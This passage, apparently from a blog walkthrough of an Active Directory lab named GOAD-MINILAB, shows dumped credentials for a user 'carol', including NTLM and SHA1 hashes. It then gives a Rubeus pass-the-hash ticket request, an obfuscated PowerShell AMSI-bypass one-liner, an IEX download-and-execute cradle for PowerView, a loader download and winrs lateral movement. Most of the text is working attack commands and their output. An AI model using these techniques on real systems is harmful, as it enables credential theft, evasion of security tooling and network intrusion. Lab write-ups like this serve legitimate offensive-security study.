+<p>SID               : S-1-5-21-3512894206-2399940235-2846696113-1109</p>
+<p>        msv :</p>
+<p>         [00000003] Primary</p>
+<p>         * Username : carol</p>
+<p>         * Domain   : MINILAB</p>
+<p>         * NTLM     : c22b315c040ae6e0efee3518d830362b</p>
+<p>         * SHA1     : e18db28dd5cb56dfaed12a2efbbddd1ce5e8006b</p>
+<p>         * DPAPI    : 561e47e65959d969977359ec2242ee23</p>
+<p>        tspkg :</p>
+<p>        wdigest :</p>
+<p>         * Username : carol</p>
+<p>         * Domain   : MINILAB</p>
+<p>         * Password : (null)</p>
+<p>        kerberos :</p>
+<p>         * Username : carol</p>
+<p>         * Domain   : MINI.LAB</p>
+<p>         * Password : (null)</p>
+<p>        ssp :</p>
+<p>        credman :</p>
+<p>        cloudap :</p>
+</code></pre>
+
+<p>I was able to find our Carol’s credentials. </p>
+
+<p>With Carol’s NTLM hash I decided to ask the user’s TGT.</p>
+
+<code>C:\Loader.exe -Path [http://127.0.0.1:8080/Rubeus.exe](http://127.0.0.1:8080/Rubeus.exe) -args asktgt /user:carol /rc4:c22b315c040ae6e0efee3518d830362b /opsec /force /domain:mini.lab /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code>
+
+<img src="GOAD-MINILAB/image%2029.png" alt="images/image-529.png">
+
+<pre><code class="language-bash">S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+</code></pre>
+
+<p>Our next task is to enumerate and find a machine in the domain where our user (<strong><code>carol</code></strong>) has local administrative access and for this we will use tools like <strong><code>Find-LocalAdminAccess</code></strong>(PowerView) </p>
+
+<code>IEX(New-Object Net.WebClient).DownloadString("[http://127.0.0.1:8080/PowerView.ps1](http://127.0.0.1:8080/PowerView.ps1)")</code>
+
+<code>Find-LocalAdminAccess -Verbose</code>
+
+<img src="GOAD-MINILAB/image%2030.png" alt="images/image-529.png">
+
+<code>Invoke-WebRequest [http://127.0.0.1:8080/fibers-loader.exe](http://127.0.0.1:8080/fibers-loader.exe) -OutFile Loader.exe -UseBasicParsing</code>
+
+<code>winrs -r:dc.mini.local cmd</code>
+
+<img src="GOAD-MINILAB/image%2031.png" alt="images/image-529.png">
+
+<img src="GOAD-MINILAB/image%2032.png" alt="images/image-529.png">
+        </section>
+      </article>
+    </div>
+  </main>
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
